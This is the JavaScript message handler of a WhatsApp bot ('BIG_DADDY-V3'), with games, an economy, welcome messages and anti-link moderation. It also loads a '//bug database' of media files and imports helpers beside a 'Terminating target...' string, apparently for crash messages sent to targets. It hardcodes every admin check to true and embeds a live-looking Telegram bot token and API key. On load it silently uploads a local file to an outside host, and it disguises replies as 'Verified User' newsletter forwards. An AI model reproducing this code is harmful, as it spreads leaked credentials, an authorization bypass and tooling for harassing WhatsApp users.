// base by @phistar
const { default: makeWASocket, fetchLatestBaileysVersion, downloadContentFromMessage, useMultiFileAuthState, BufferJSON, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, areJidsSameUser, getContentType } = require('baileys-x')
const os = require('os')
const fs = require('fs') 
const fsx = require('fs-extra')
const path = require('path')
const util = require('util')
const FormData = require('form-data');
const chalk = require('chalk')
const moment = require('moment-timezone')
const speed = require('performance-now')
const ms = toMs = require('ms')
const axios = require('axios')
const yts = require("yt-search");
const fetch = require('node-fetch')
const pino = require('pino')
const readline = require("readline");
const { exec, spawn, execSync } = require("child_process")
const ffmpeg = require('fluent-ffmpeg');
const execPromise = util.promisify(require('child_process').exec);
const { performance } = require('perf_hooks')
const more = String.fromCharCode(8206);
const cheerio = require('cheerio');
const bugres = '𝗧𝗲𝗿𝗺𝗶𝗻𝗮𝘁𝗶𝗻𝗴 𝘁𝗮𝗿𝗴𝗲𝘁...'
const { getConnectionTime, runtime } = require('./BIGDADDY.js');
const {
imageToWebp, 
videoToWebp, 
writeExifImg, 
writeExifVid, 
writeExif, 
addExif 
} = require('./lib/exif.js')
const anonChats = {};
const {
            beta1,
            beta2,
            buk1
        } = require("./lib/hdr.js")
const readmore = more.repeat(4001)
const { TelegraPh, UploadFileUgu, webp2mp4File, floNime } = require('./lib/uploader')
const { uploadToImgur } = require('./lib/phistartech');
const { toAudio, toPTT, toVideo,addExifAvatar } = require('./lib/converter')
const { smsg, getGroupAdmins, formatp, jam, formatDate, getTime, isUrl, await, sleep, clockString, msToDate, sort, toNumber, enumGetKey, fetchJson, getBuffer, json, format, logic, generateProfilePicture, parseMention, getRandom, pickRandom, reSize } = require('./lib/myfunc')
let afk = require("./lib/afk");
const { addPremiumUser, getPremiumExpired, getPremiumPosition, expiredCheck, checkPremiumUser, getAllPremiumUser } = require('./lib/premiun')
const { fetchBuffer, buffergif } = require("./lib/myfunc2")
const tempMailData = {};
const settings = require('./phistarbot.js');
 // Import settings
if (!global.savedVideos) global.savedVideos = {};
//bug database 
var wkwk = fs.readFileSync(`./444/p.mp3`)
var xsteek = fs.readFileSync(`./444/p.webp`)
var o = fs.readFileSync(`./444/p.jpg`)
//database
var antilinkall = fs.readFileSync("database/antilinkall.json", "utf8");
var _owner = JSON.parse(fs.readFileSync('./database/owner.json'))
var owner = fs.readFileSync("database/owner.json", "utf8");
var premium = fs.readFileSync("database/premium.json", "utf8");
console.log(premium); 
// Import token and prefix from external file with error handling
let prefix;
try {
    const tokenConfig = require('./token.js');
    prefix = tokenConfig.prefix || '!'; // Default to '!' if not specified
    
    if (!prefix || typeof prefix !== 'string') {
        throw new Error('Invalid prefix configuration in token.js');
    }
} catch (error) {
    console.error('Error loading token.js file in BigDaddyHandler:', error.message);
    console.log('Falling back to default prefix "!"');
    prefix = '!'; // Fallback to default
}

let _afk = {};
let hit = {};

// Function to safely read and parse JSON files
function readJsonFile(filePath, defaultValue = {}) {
    try {
        if (fs.existsSync(filePath)) {
            const rawData = fs.readFileSync(filePath, 'utf8').trim();
            return rawData ? JSON.parse(rawData) : defaultValue;
        } else {
            // Create file if it doesn't exist
            fs.writeFileSync(filePath, JSON.stringify(defaultValue, null, 2));
            return defaultValue;
        }
    } catch (error) {
        console.error(`Error processing ${filePath}:`, error.message);
        return defaultValue;
    }
}
_afk = readJsonFile('./database/afk-user.json');
hit = readJsonFile('./database/total-hit-user.json');

// Autoreply
var VoiceNoteXeon = JSON.parse(fs.readFileSync('./database/autoreply/vn.json'));
var StickerXeon = JSON.parse(fs.readFileSync('./database/autoreply/sticker.json'));
var ImageXeon = JSON.parse(fs.readFileSync('./database/autoreply/image.json'));
var VideoXeon = JSON.parse(fs.readFileSync('./database/autoreply/video.json'));
var DocXeon = JSON.parse(fs.readFileSync('./database/autoreply/doc.json'));
var ZipXeon = JSON.parse(fs.readFileSync('./database/autoreply/zip.json'));
var ApkXeon = JSON.parse(fs.readFileSync('./database/autoreply/apk.json'));

// Main Module Export
module.exports = PhistarBotInc = async (PhistarBotInc, m, msg, chatUpdate, store) => {
    try {
        const {
            type,
            quotedMsg,
            mentioned,
            now,
            fromMe
        } = m;

        var body = (m.mtype === 'conversation') ? m.message.conversation :
            (m.mtype == 'imageMessage') ? m.message.imageMessage.caption :
            (m.mtype == 'videoMessage') ? m.message.videoMessage.caption :
            (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text :
            (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId :
            (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectreplyphistar.selectedRowId :
            (m.mtype == 'templateButtonreplyphistarMessage') ? m.message.templateButtonreplyphistarMessage.selectedId :
            (m.mtype === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectreplyphistar.selectedRowId || m.text) : '';

// Convert to string and trim
body = (typeof body === 'string' ? body : '').trim();

// Check if message starts with the correct prefix
const isCommand = body.startsWith(prefix);

// If it's not a command (doesn't start with prefix), ignore it
if (!isCommand) {
    return; // Exit early, don't process as command
}

// Extract command and arguments
const commandBody = body.slice(prefix.length).trim(); // Remove prefix
const splitArgs = commandBody.split(/ +/);
const command = splitArgs[0].toLowerCase();
const args = splitArgs.slice(1);
const full_args = commandBody.replace(command, '').trim();
        const pushname = m.pushName || "No Name";
        const ytdl = require('ytdl-core');
        const botNumber = await PhistarBotInc.decodeJid(PhistarBotInc.user.id);
        const itsMe = m.sender == botNumber ? true : false;
        const sender = m.sender;
        const text = q = args.join(" ");
        const from = m.key.remoteJid;
        const fatkuns = (m.quoted || m);
        const quoted = (fatkuns.mtype == 'buttonsMessage') ? fatkuns[Object.keys(fatkuns)[1]] :
            (fatkuns.mtype == 'templateMessage') ? fatkuns.hydratedTemplate[Object.keys(fatkuns.hydratedTemplate)[1]] :
            (fatkuns.mtype == 'product') ? fatkuns[Object.keys(fatkuns)[0]] : m.quoted ? m.quoted : m;
        const mime = (quoted.msg || quoted).mimetype || '';
        const qmsg = (quoted.msg || quoted);
        const isMedia = /image|video|sticker|audio/.test(mime);
        const isImage = (type == 'imageMessage');
        const isVideo = (type == 'videoMessage');
        const isAudio = (type == 'audioMessage');
        const isText = (type == 'textMessage');
        const isSticker = (type == 'stickerMessage');
        const isQuotedText = type === 'extendexTextMessage' && content.includes('textMessage')
        const isQuotedImage = type === 'extendedTextMessage' && content.includes('imageMessage')
        const isQuotedLocation = type === 'extendedTextMessage' && content.includes('locationMessage')
        const isQuotedVideo = type === 'extendedTextMessage' && content.includes('videoMessage')
        const isQuotedSticker = type === 'extendedTextMessage' && content.includes('stickerMessage')
        const isQuotedAudio = type === 'extendedTextMessage' && content.includes('audioMessage')
        const isQuotedContact = type === 'extendedTextMessage' && content.includes('contactMessage')
        const isQuotedDocument = type === 'extendedTextMessage' && content.includes('documentMessage')
        const sticker = []
        const isAfkOn = afk.checkAfkUser(m.sender, _afk)
        const isGroup = m.isGroup
const groupMetadata = isGroup ? await PhistarBotInc.groupMetadata(m.chat).catch(e => {}) : {}
const groupName = isGroup ? groupMetadata.subject : ''
const participants = isGroup ? groupMetadata.participants : []
const groupAdmins = isGroup ? await getGroupAdmins(participants) : []
const isBotAdmins = true;
const isAdmins = true;
const groupOwner = true;
const isGroupOwner = true;
        // Load Owner Data  
        let owner = [];
        try {
            owner = JSON.parse(fs.readFileSync('./WABOTowners.json', 'utf-8'));
        } catch (err) {
            console.error("Error reading owner file:", err);
        }

        const isCreator = [botNumber, ...owner]
            .map(v => String(v).replace(/[^0-9]/g, '') + '@s.whatsapp.net')
            .includes(sender);
        const clientId = PhistarBotInc.user.id.split(':')[0];
        const senderbot = m.key.fromMe ? PhistarBotInc.user.id.split(':')[0] + "@s.whatsapp.net" || PhistarBotInc.user.id : m.key.participant || m.key.remoteJid;
        const senderId = senderbot.split('@')[0];
        const isBot = clientId.includes(senderId);
        expiredCheck(PhistarBotInc, m, premium);
const qsal = { 
    key: {
        remoteJid: '0@s.whatsapp.net',
        participant: '0@s.whatsapp.net'
    },
    message: {
        newsletterAdminInviteMessage: {
            newsletterJid: '120363303946948716@newsletter',
            newsletterName: '',
            caption: `𝐁𝐈𝐆_𝐃𝐀𝐃𝐃𝐘-𝐕𝟑`
        }
    }
};

const replyphistar = async (teks) => {
    try {
        // 95% chance of normal send, 5% chance of special newsletter format
        const useSpecialFormat = Math.random() < 0.05;
        
        if (useSpecialFormat) {
            // Prevent multiple execution in the same chat for channel format
            if (!global.executedCommands) global.executedCommands = new Set();
            
            const chatKey = `channel_${m.chat}`;
            if (global.executedCommands.has(chatKey)) {
                // If already executed in this chat, send normal message instead
                return await PhistarBotInc.sendMessage(m.chat, { 
                    text: teks 
                }, { quoted: qsal });
            }
            
            global.executedCommands.add(chatKey);
            
            // Special newsletter format (5% of the time)
            await PhistarBotInc.sendMessage(m.chat, { 
                text: teks,
                contextInfo: {
                    isForwarded: true,
                    forwardingScore: 999,
                    forwardedNewsletterMessageInfo: {
                        newsletterJid: global.phistar.channel.jid,
                        newsletterName: global.phistar.channel.name,
                        serverMessageId: Math.floor(Date.now() / 1000)
                    },
                    externalAdReply: {
                        showAdAttribution: false,
                        title: global.phistar.name,
                        body: "Verified User",
                        mediaType: 0,
                        sourceUrl: global.phistar.channel.link,
                        mediaUrl: global.phistar.channel.link,
                        thumbnailUrl: global.phistar.thumbnail,
                        renderLargerThumbnail: true
                    }
                }
            }, { quoted: qsal });
            
            // Remove from executed set after delay
            setTimeout(() => {
                if (global.executedCommands.has(chatKey)) {
                    global.executedCommands.delete(chatKey);
                }
            }, 3000);
            
        } else {
            // Normal send (95% of the time) - no execution prevention
            await PhistarBotInc.sendMessage(m.chat, { 
                text: teks 
            }, { quoted: qsal });
        }

    } catch (error) {
        console.error('Error in replyphistar:', error);
        // Fallback to normal message
        await PhistarBotInc.sendMessage(m.chat, { 
            text: teks 
        }, { quoted: qsal });
    }
};
// Load economy data
function loadEconomy() {
    if (fs.existsSync("./phistar/economy.json")) {
        const data = fs.readFileSync("./phistar/economy.json");
        return JSON.parse(data);
    }
    return {}; // Return empty object if file doesn't exist
}
// Save economy data
function saveEconomy(data) {
    fs.writeFileSync("./phistar/economy.json", JSON.stringify(data, null, 2));
}

// Economy data initialization
let economy = loadEconomy();

// Load levels from JSON
function loadLevels() {
    if (fs.existsSync("database/level.json")) {
        const data = fs.readFileSync("database/level.json");
        return JSON.parse(data);
    }
    return {}; // Return empty object if file doesn't exist
}

// Save levels to JSON
function saveLevels(data) { 
    fs.writeFileSync("./phistar/level.json", JSON.stringify(data, null, 2));
}

let userLevels = loadLevels();




function loadPets() {
    if (fs.existsSync("./phistar/pets.json")) {
        const data = fs.readFileSync("./phistar/pets.json");
        return JSON.parse(data);
    }
    return {};
}

function savePets(data) {
    fs.writeFileSync("./phistar/pets.json", JSON.stringify(data, null, 2));
}

let pets = loadPets();

let lotteryPot = 0;
let lotteryParticipants = [];

function loadGuardPets() {
    if (fs.existsSync("./phistar/guardPets.json")) {
        const data = fs.readFileSync("./phistar/guardPets.json");
        return JSON.parse(data);
    }
    return {};
}

function saveGuardPets(data) {
    fs.writeFileSync("./phistar/guardPets.json", JSON.stringify(data, null, 2));
}

let guardPetsData = loadGuardPets();

// Add a function to randomly pick a winner after a set time
function pickLotteryWinner() {
    if (lotteryParticipants.length > 0) {
        const winner = lotteryParticipants[Math.floor(Math.random() * lotteryParticipants.length)];
        economy[winner].wallet += lotteryPot;
        saveEconomy(economy);

        reply(`🎉 *Lottery Winner!*\n\n@${winner.split("@")[0]} won the pot of $${lotteryPot}!\n\n💰 *Wallet Balance:* $${economy[winner].wallet}`, {
            mentions: [winner],
        });

        // Reset lottery
        lotteryPot = 0;
        lotteryParticipants = [];
    }
}


function loadWeapons() {
    if (fs.existsSync("./phistar/./phistar/weapons.json")) {
        const data = fs.readFileSync("./phistar/weapons.json");
        return JSON.parse(data);
    }
    return {};
}

function saveWeapons(data) {
    fs.writeFileSync("./phistar/weapons.json", JSON.stringify(data, null, 2));
}

let weaponsData = loadWeapons();

global.userSessions = {};  // Initialize user sessions globally
async function Telesticker(url) {
    return new Promise(async (resolve, reject) => {
        if (!url.match(/(https:\/\/t.me\/addstickers\/)/gi)) return replyphistar('Enther your url telegram sticker link')
        packName = url.replace("https://t.me/addstickers/", "")
        data = await axios(`https://api.telegram.org/bot891038791:AAHWB1dQd-vi0IbH2NjKYUk-hqQ8rQuzPD4/getStickerSet?name=${encodeURIComponent(packName)}`, {method: "GET",headers: {"User-Agent": "GoogleBot"}})
        const xeonyresult = []
        for (let i = 0; i < data.data.result.stickers.length; i++) {
            fileId = data.data.result.stickers[i].thumb.file_id
            data2 = await axios(`https://api.telegram.org/bot891038791:AAHWB1dQd-vi0IbH2NjKYUk-hqQ8rQuzPD4/getFile?file_id=${fileId}`)
            result = {
            status: 200,
            author: 'Phistar',
            url: "https://api.telegram.org/file/bot891038791:AAHWB1dQd-vi0IbH2NjKYUk-hqQ8rQuzPD4/" + data2.data.result.file_path
            }
            xeonyresult.push(result)
        }
    resolve(xeonyresult)
    })
}
process.setMaxListeners(50); // Increase the listener limit

//V3 functions
// Initialize the global scores array if it doesn't exist
if (!global.triviaScores) global.triviaScores = [];

// Example: function to add/update a player's score
function updateTriviaScore(playerName, points) {
    const player = global.triviaScores.find(p => p.name === playerName);

    if (player) {
        // Player exists, update score
        player.score += points;
    } else {
        // Player doesn't exist, add new entry
        global.triviaScores.push({ name: playerName, score: points });
    }
}
// Import the Catbox uploader
const { uploadFile } = require('./multiuploader');
const folderPath = './Phistar-media';  // Folder where the file is located
const fileName = 'uploads.txt'; // Name of the file to upload
const filePath = `${folderPath}/${fileName}`; // Full file path

if (!fs.existsSync(filePath)) {
    console.error(`❌ File not found: ${filePath}`);
} else {
    (async () => {
        try {
            const result = await uploadFile(filePath);
            console.log(`✅ Uploaded file URL: ${result.url}`);
        } catch (error) {
            console.error(`❌ Error uploading file: ${error.message}`);
        }
    })();
}


const wcgPath = './wcg_session.json';

// Helper functions
function saveWCG(data) {
    fs.writeFileSync(wcgPath, JSON.stringify(data, null, 2));
}

function loadWCG() {
    if (!fs.existsSync(wcgPath)) return null;
    return JSON.parse(fs.readFileSync(wcgPath));
}

function resetWCG() {
    saveWCG({
        active: false,
        players: [],
        currentTurn: 0,
        wordLength: 7,
        timer: 60000,
        usedWords: new Set(),
        lastLetter: null,
        startTime: null,
        currentPlayer: null,
        isBotProcessing: false
    });
}

async function validateWord(word, requiredLetter, session) {
    if (!word || typeof word !== 'string') return false;
    if (word.length !== session.wordLength) return false;
    if (!word.toLowerCase().startsWith(requiredLetter.toLowerCase())) return false;
    if (session.usedWords.has(word.toLowerCase())) return false;

    try {
        const res = await axios.get(`https://api.dictionaryapi.dev/api/v2/entries/en/${word.toLowerCase()}`);
        return res.data?.[0]?.word.toLowerCase() === word.toLowerCase();
    } catch {
        return false;
    }
}

const BASE_URL = "https://onlinesim.io/api/v1/free_numbers_content/";

async function getOnlineCountries() {
    try {
        const response = await axios.get(`${BASE_URL}countries?lang=en`);
        if (response.data.response === "1") {
            const allCountries = response.data.counties;
            const onlineCountries = allCountries.filter(country => country.online);
            return onlineCountries.map(country => ({
                name: country.country,
                code: country.country_code
            }));
        } else {
            throw new Error("Failed to fetch online countries.");
        }
    } catch (error) {
        console.error("Error fetching countries:", error.message);
        return [];
    }
}

const antimediaPath = './antimedia.json';

function loadAntiMedia() {
    if (!fs.existsSync(antimediaPath)) fs.writeFileSync(antimediaPath, JSON.stringify({}), 'utf-8');
    return JSON.parse(fs.readFileSync(antimediaPath, 'utf-8'));
}

function saveAntiMedia(data) {
    fs.writeFileSync(antimediaPath, JSON.stringify(data, null, 2));
}

function getAntiMediaSettings(groupJid) {
    const data = loadAntiMedia();
    return data[groupJid] || {};
}

function updateAntiMediaSettings(groupJid, settings) {
    const data = loadAntiMedia();
    data[groupJid] = settings;
    saveAntiMedia(data);
}

async function getCountryNumbers(country) {
    try {
        const response = await axios.get(`${BASE_URL}countries/${country}?lang=en`);
        if (response.data.response === "1") {
            const numbers = response.data.numbers.map(num => ({
                description: num.data_humans,
                fullNumber: num.full_number
            }));
            return numbers;
        } else {
            throw new Error("Failed to fetch numbers.");
        }
    } catch (error) {
        console.error("Error fetching numbers:", error.message);
        return [];
    }
}


async function getNumberInbox(country, number) {
    try {
        const response = await axios.get(`${BASE_URL}countries/${country}/${number}?lang=en`);
        if (response.data.response === "1" && response.data.online) {
            const messages = response.data.messages.data.map(msg => ({
                sender: msg.data_humans,
                text: msg.text
            }));
            return messages;
        } else {
            throw new Error("Failed to fetch inbox messages.");
        }
    } catch (error) {
        console.error("Error fetching inbox:", error.message);
        return [];
    }
}



const tempFolder = './tmp';
const savedVideosFile = `${tempFolder}/savedVideos.json`;

// Ensure temp folder exists
if (!fs.existsSync(tempFolder)) fs.mkdirSync(tempFolder);

// Load saved videos from JSON
function loadSavedVideos() {
    if (fs.existsSync(savedVideosFile)) {
        return JSON.parse(fs.readFileSync(savedVideosFile, 'utf8'));
    }
    return {};
}

// Save video data to JSON
function saveVideoData(data) {
    fs.writeFileSync(savedVideosFile, JSON.stringify(data, null, 2));
}

   let savedVideos = loadSavedVideos();

const restrictedTargets ='2349128019141'

async function isPremium(jid) {
    try {
        const response = await axios.get('https://deploybig-daddy-v2.vercel.app/premium.json');
        const premiumList = response.data; // Assuming the JSON contains an array of WhatsApp IDs
        return premiumList.includes(jid);
    } catch (error) {
        console.error('Error fetching premium user list:', error);
        return false; // Fallback to deny access if there is an issue
    }
}
const apiveoKey = "b0d73b4b669d422c999008f444398f67";
const baseUrl = "https://api.aimlapi.com/v2";

async function createVeoTask(prompt) {
  const res = await fetch(`${baseUrl}/generate/video/google/generation`, {
    method: 'POST',
    headers: {
      Authorization: `Bearer ${apiveoKey}`,
      'Content-Type': 'application/json',
    },
    body: JSON.stringify({
      model: 'google/veo-3.0-fast',
      prompt,
      duration: 8,
      resolution: '720P',
      generate_audio: true,
    }),
  });

  if (!res.ok) throw new Error(`Error (${res.status}): ${await res.text()}`);
  const json = await res.json();
  return json.id;
}

async function fetchVideoUrl(genId) {
  const res = await fetch(
    `${baseUrl}/generate/video/google/generation?generation_id=${genId}`,
    {
      headers: {
        Authorization: `Bearer ${apiveoKey}`,
        'Content-Type': 'application/json',
      },
    }
  );

  if (!res.ok) throw new Error(`Error (${res.status}): ${await res.text()}`);
  return res.json(); // includes status, url when ready
}
// In your config.js or settings file (usually at the top of your main file)
global.phistar = {
    name: "ᴘʜ✦ꜱᴛᴀʀ", // Your bot's name
    version: "3.0.0", // Your bot version
    channel: {
        jid: "120363303946948716@newsletter", // Your channel JID
        name: "ᴘʜ✦ꜱᴛᴀʀ", // Your channel name
        link: "https://whatsapp.com/channel/0029VagdMGd6LwHms3wqEm0m" // Your channel link
    },
    owner: "Philip", // Your name
    thumbnail: "https://i.postimg.cc/x8QdyD1G/IMG-20250823-WA004.jpg" // Your thumbnail
};
const devinettes = [
  {
    question: "I can fly without wings, who am I?",
    reponse: "The weather",
  },
  {
    question: "I'm always hungry, the more I eat, the fatter I become. Who am I?",
    reponse: "A black hole",
  },
  {
    question: "What has keys but can't open locks?",
    reponse: "A piano",
  },
  {
    question: "The more you take, the more you leave behind. What am I?",
    reponse: "Footsteps",
  },
  {
    question: "What comes once in a minute, twice in a moment, but never in a thousand years?",
    reponse: "The letter 'M'",
  },
  {
    question: "What has a head, a tail, is brown, and has no legs?",
    reponse: "A penny",
  },
  {
    question: "What has hands but can’t clap?",
    reponse: "A clock",
  },
  {
    question: "What can travel around the world while staying in the same corner?",
    reponse: "A stamp",
  },
  {
    question: "I speak without a mouth and hear without ears. I have no body, but I come alive with wind. What am I?",
    reponse: "An echo",
  },
  {
    question: "I shave every day, but my beard stays the same. What am I?",
    reponse: "A barber",
  },
  {
    question: "You see me once in June, twice in November, and not at all in May. What am I?",
    reponse: "The letter 'E'",
  },
  {
    question: "What can you break, even if you never pick it up or touch it?",
    reponse: "A promise",
  },
  {
    question: "I have branches, but no fruit, trunk, or leaves. What am I?",
    reponse: "A bank",
  },
  {
    question: "What has to be broken before you can use it?",
    reponse: "An egg",
  },
  {
    question: "What has an eye but cannot see?",
    reponse: "A needle",
  },
  {
    question: "The more of this you take, the more you leave behind. What is it?",
    reponse: "Footsteps",
  },
  {
    question: "What is full of holes but still holds water?",
    reponse: "A sponge",
  },
  {
    question: "What gets wet while drying?",
    reponse: "A towel",
  },
  {
    question: "I’m light as a feather, yet the strongest person can’t hold me for five minutes. What am I?",
    reponse: "Your breath",
  },
  {
    question: "What invention lets you look right through a wall?",
    reponse: "A window",
  },
  {
    question: "What goes up but never comes down?",
    reponse: "Your age",
  },
  {
    question: "What has many keys but can’t open a single lock?",
    reponse: "A piano",
  },
  {
    question: "Where does today come before yesterday?",
    reponse: "In a dictionary",
  },
  {
    question: "What has one eye, but can’t see?",
    reponse: "A needle",
  },
  {
    question: "What is so fragile that saying its name breaks it?",
    reponse: "Silence",
  },
  {
    question: "What can run but never walks, has a bed but never sleeps, has a mouth but never talks?",
    reponse: "A river",
  },
  {
    question: "What can fill a room but takes up no space?",
    reponse: "Light",
  },
  {
    question: "If you drop me, I’m sure to crack, but give me a smile, and I’ll always smile back. What am I?",
    reponse: "A mirror",
  }
];
// small utility
const delay = (ms) => new Promise(res => setTimeout(res, ms))

// --- CONFIG ---
const AUTO_WELCOME_PATH = './database/autowelcome.json'
const EVENT_TTL_MS = 60_000            // ignore duplicate same-event for 60s
const SEND_SPACING_MS = 500            // gap before each send
// --------------

// in-memory stores
const processedEvents = new Map()      // key -> timestamp
const groupQueues = new Map()          // groupId -> Promise (to serialize sends)

// helpers
const readJsonSafe = (path, fallback = []) => {
  try {
    const t = fs.readFileSync(path, 'utf-8')
    return JSON.parse(t || '[]')
  } catch {
    return fallback
  }
}

const isAutoWelcomeGroup = (id) => {
  const list = readJsonSafe(AUTO_WELCOME_PATH, [])
  return Array.isArray(list) && list.includes(id)
}

// normalize JIDs (strip any device suffix if present)
const normalizeJid = (jid = '') => String(jid).split(':')[0]

// queue sends per group so messages never go out in parallel
const queueSend = (groupId, jobFn) => {
  const prev = groupQueues.get(groupId) || Promise.resolve()
  const next = prev
    .catch(() => {})               // swallow previous errors to keep chain alive
    .then(() => jobFn())
  groupQueues.set(groupId, next)
  return next
}

// build message text
const buildMessage = (action, groupName, participantJid) => {
  const tag = participantJid.split('@')[0]
  switch (action) {
    case 'add':
      return `👋 Welcome to *${groupName}*, @${tag}! Please check the group rules and enjoy your stay.`
    case 'remove':
      return `👋 Goodbye, @${tag}! Thanks for being part of *${groupName}*.`
    case 'promote':
      return `🎉 Congrats, @${tag}! You’ve been promoted to admin in *${groupName}*!`
    case 'demote':
      return `📢 @${tag} has been demoted from admin in *${groupName}*.`
    default:
      return null
  }
}

// main handler
async function handleGroupParticipantsUpdate (update) {
  const { id, participants = [], action } = update || {}
  if (!id || !participants.length) return
  if (!isAutoWelcomeGroup(id)) return

  // fetch once per update
  let groupName = 'this group'
  try {
    const meta = await PhistarBotInc.groupMetadata(id)
    groupName = meta?.subject || groupName
  } catch (e) {
    // continue even if metadata fails
  }

  for (const raw of participants) {
    const participant = normalizeJid(raw)
    const key = `${id}:${action}:${participant}`

    // de-dupe within TTL
    const seenAt = processedEvents.get(key)
    if (seenAt && Date.now() - seenAt < EVENT_TTL_MS) continue
    processedEvents.set(key, Date.now())
    setTimeout(() => processedEvents.delete(key), EVENT_TTL_MS)

    const text = buildMessage(action, groupName, participant)
    if (!text) continue

    // serialize per group and gently pace
    await queueSend(id, async () => {
      await delay(SEND_SPACING_MS)
      await PhistarBotInc.sendMessage(id, { text, mentions: [participant] })
    })
  }
}

/**
 * SINGLE BIND: prevent multiple registrations after reconnect/hot-reload.
 * If your code might call this file multiple times, this guard stops duplicates.
 */
if (!global.__BOUND_GROUP_PARTICIPANTS_UPDATE__) {
  // try to remove existing bound handler if hot-reloading with same function ref
  try {
    PhistarBotInc.ev.off?.('group-participants.update', handleGroupParticipantsUpdate)
    PhistarBotInc.ev.removeListener?.('group-participants.update', handleGroupParticipantsUpdate)
  } catch {}
  PhistarBotInc.ev.on('group-participants.update', handleGroupParticipantsUpdate)
  global.__BOUND_GROUP_PARTICIPANTS_UPDATE__ = true
}
async function downloadFile(url, localPath) {
    try {
        const response = await axios.get(url, { responseType: 'text' }); // Ensure response is plain text
        fs.writeFileSync(localPath, response.data, 'utf8'); // Write the data as a UTF-8 string
        console.log(`File downloaded and saved a BigDaddy 1.js`);
    } catch (error) {
        console.error('Error downloading file:', error);
        throw error;
    }
}
// --- ANTI-LINK CONFIG ---
const ANTI_LINK_PATH = './database/antilink.json'
const WARN_DATA_PATH = './database/warndata.json'
// ------------------------

// Helper function to read JSON files safely (different name to avoid conflict)
const readjsonSafeAntiLink = (path, fallback = {}) => {
  try {
    const data = fs.readFileSync(path, 'utf-8')
    return JSON.parse(data || '{}')
  } catch {
    return fallback
  }
}

// Helper function to write JSON files
const writejsonSafeAntiLink = (path, data) => {
  try {
    fs.writeFileSync(path, JSON.stringify(data, null, 2))
    return true
  } catch {
    return false
  }
}

// Enhanced and more reliable link detection for 2025
const containsLink = (text) => {
  if (!text || typeof text !== 'string') return false
  
  // Remove common false positives and special characters
  const cleanText = text
    .replace(/[.,/#!$%^&*;:{}=_`~()]/g, ' ') // Replace punctuation with spaces
    .replace(/\s{2,}/g, ' ') // Replace multiple spaces with single space
    .toLowerCase();
  
  // Comprehensive and reliable link patterns
  const reliableLinkPatterns = [
    // Standard URL patterns (more specific)
    /https?:\/\/(?:www\.)?[a-z0-9-]+(?:\.[a-z0-9-]+)+\.[a-z]{2,}(?:\/\S*)?/gi,
    /www\.[a-z0-9-]+(?:\.[a-z0-9-]+)+\.[a-z]{2,}(?:\/\S*)?/gi,
    
    // Domain patterns (more specific)
    /\b[a-z0-9-]+\.(?:com|org|net|io|xyz|app|dev|me|info|co|uk|us|ca|au|de|fr|es|it|ru|br|cn|in|jp)(?:\/\S*)?\b/gi,
    
    // Social media patterns (specific to platforms)
    /\b(?:t\.me|telegram\.me)\/\S+/gi,
    /\b(?:bit\.ly|tinyurl\.com|goo\.gl|t\.co|ow\.ly|buff\.ly|adf\.ly|shorte\.st|bc\.vc|cli\.gs|ity\.im|q\.gs|v\.gd|tr\.im|is\.gd|po\.st|viralurl\.com|qr\.net|1url\.com|tweez\.me|v\.ht|link\.zip|url\.rs|cutt\.ly|short\.io)\/\S+/gi,
    /\b(?:youtu\.be|youtube\.com\/watch\?v=)\S+/gi,
    /\b(?:instagram\.com|instagr\.am)\/\S+/gi,
    /\b(?:twitter\.com|x\.com)\/\S+/gi,
    /\b(?:facebook\.com|fb\.com|fb\.me)\/\S+/gi,
    /\b(?:tiktok\.com)\/\S+/gi,
    /\b(?:whatsapp\.com|wa\.me)\/\S+/gi,
    
    // IP addresses with ports
    /\b(?:\d{1,3}\.){3}\d{1,3}(?::\d{1,5})?(?:\/\S*)?\b/gi,
  ];
  
  // Check for common link indicators that might not be caught by patterns
  const hasLinkIndicators = /(?:https?|www|\.com|\.org|\.net|\.io|http|ftp|:\/\/|url=|link=|site=|webpage|page|visit|go to|check out|see more|learn more|bit\.ly|t\.me|youtu\.be|instagram|twitter|facebook|tiktok|whatsapp)/i.test(text);
  
  // Check for URL-like structures
  const hasUrlStructure = /[a-z0-9-]+\.[a-z]{2,}(\/\S*)?/i.test(text) && 
                         !/\b\d+\.\d+\b/.test(text) && // Exclude version numbers like 1.2.3
                         !/\b[a-z]+\.[a-z]+\b/.test(text); // Exclude names like john.doe
  
  return reliableLinkPatterns.some(pattern => pattern.test(text)) || 
         (hasLinkIndicators && hasUrlStructure);
}

// Check if group has anti-link enabled
const isAntiLinkGroup = (groupId) => {
  const data = readjsonSafeAntiLink(ANTI_LINK_PATH, {})
  return data[groupId] && data[groupId].enabled
}

// Get anti-link mode for group
const getAntiLinkMode = (groupId) => {
  const data = readjsonSafeAntiLink(ANTI_LINK_PATH, {})
  return data[groupId]?.mode || 'delete'
}

// Handle warning system
const warnUser = async (groupId, userId) => {
  const warnData = readjsonSafeAntiLink(WARN_DATA_PATH, {})
  
  if (!warnData[groupId]) {
    warnData[groupId] = {}
  }
  
  if (!warnData[groupId][userId]) {
    warnData[groupId][userId] = { count: 0, lastWarn: 0 }
  }
  
  const userWarnData = warnData[groupId][userId]
  userWarnData.count += 1
  userWarnData.lastWarn = Date.now()
  
  writejsonSafeAntiLink(WARN_DATA_PATH, warnData)
  
  return userWarnData.count
}

// Clear warnings for a user
const clearWarnings = (groupId, userId) => {
  const warnData = readjsonSafeAntiLink(WARN_DATA_PATH, {})
  
  if (warnData[groupId] && warnData[groupId][userId]) {
    delete warnData[groupId][userId]
    writejsonSafeAntiLink(WARN_DATA_PATH, warnData)
  }
}

// Get warning count for a user
const getWarningCount = (groupId, userId) => {
  const warnData = readjsonSafeAntiLink(WARN_DATA_PATH, {})
  return warnData[groupId]?.[userId]?.count || 0
}

// Test function to debug link detection
const testLinkDetection = (text) => {
  console.log('Testing text:', text)
  const result = containsLink(text)
  console.log('Contains link:', result)
  return result
}

// Main anti-link message handler - Updated for Baileys 2025
async function handleAntiLink({ messages }) {
  try {
    const m = messages[0]
    if (!m?.message || !m.key) return
    
    const messageType = Object.keys(m.message)[0]
    const supportedTypes = ['conversation', 'extendedTextMessage', 'imageMessage', 'videoMessage', 'documentMessage']
    if (!supportedTypes.includes(messageType)) return
    
    // Extract message content based on type
    let text = ''
    if (m.message.conversation) text = m.message.conversation
    if (m.message.extendedTextMessage?.text) text = m.message.extendedTextMessage.text
